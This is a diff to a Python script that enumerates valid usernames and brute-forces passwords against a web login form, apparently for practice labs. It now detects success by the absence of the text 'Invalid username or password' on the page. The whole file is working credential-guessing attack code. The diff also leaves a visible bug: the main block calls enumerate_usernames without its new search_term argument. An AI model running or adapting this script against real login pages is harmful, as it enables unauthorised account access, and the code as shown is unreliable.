@@ -9,8 +9,9 @@ USERS_LIST = 'authentication/wordlists/usernames.txt'
 PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
 USER_INPUT_NAME = 'username'
 PASSWORD_INPUT_NAME = 'password'
+SEARCH_TERM = 'Invalid username or password '
 
-def enumerate_usernames(target, users_list, user_input_name, password_input_name, timeout=10):
+def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
     session = requests.Session()
     response = session.get(target, timeout=timeout)
     params = get_params(response.content)
@@ -41,11 +42,10 @@ def enumerate_usernames(target, users_list, user_input_name, password_input_name
             print(f'Possible username identifed: {username}')
             print(f'Regular failed login status code: {failed_response.status_code}')
             print(f'Login with username {username} status code: {test_response.status_code}')
-        elif test_response.content != failed_response.content:
+        elif not search_tree(test_response.content, search_term):
             potential_usernames.append(username)
             print(f'Possible username identified: {username}')
-            print(f'Regular failed login content length: {failed_response.headers.get('Content-Length')}')
-            print(f'Login with the username {username} content length: {test_response.headers.get('Content-Length')}')
+            print(f'Text on failed login not present for {username}')
         else:
             print(f'No variance for username: {username}')
 
@@ -56,7 +56,7 @@ def enumerate_usernames(target, users_list, user_input_name, password_input_name
 
     return potential_usernames
 
-def enumerate_password(target, usernames, pwd_list, user_input_name, password_input_name, timeout=10):
+def enumerate_password(target, usernames, pwd_list, user_input_name, password_input_name, search_term, timeout=10):
     passwords = list()
 
     try:
@@ -92,13 +92,12 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
             print(f'Login with username {username} and password {password} status code: {test_response.status_code}')
             session = requests.Session()
             session.get(target)
-        elif test_response.content != failed_response.content:
+        elif not search_tree(test_response.content, search_term):
             potential_credentials.append({'user': username, 'pwd': password})
             print(f'Possible credentials identifed: user: {username} pwd: {password}')
-            print(f'Regular failed login content length: {failed_response.headers.get('Content-Length')}')
-            print(f'Login with the username {username} and password {password} content length: {test_response.headers.get('Content-Length')}')
-            session = requests.Session()
-            session.get(target)
+            print(f'Text on failed login not present for {username} and password {password}')
+            #session = requests.Session()
+            #session.get(target)
         else:
             print(f'No variance for username: {username} and password: {password}')
 
@@ -109,8 +108,6 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
     
     return potential_credentials
     
-
-
 def get_params(content):
     params = dict()
     parser = etree.HTMLParser()
@@ -124,12 +121,20 @@ def get_params(content):
     
     return params
 
+def search_tree(content, term):
+    parser = etree.HTMLParser()
+    tree = etree.parse(BytesIO(content), parser=parser)
+
+    return tree.xpath(f'.//*[text()=\'{term}\']')
+
 if __name__ == '__main__':
+    #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT)
     enumerate_password(
         TARGET,
-        ['appserver'], #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT),
+        enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT),
         PASSWORD_LIST,
         USER_INPUT_NAME,
         PASSWORD_INPUT_NAME,
+        SEARCH_TERM,
         TIMEOUT
     )
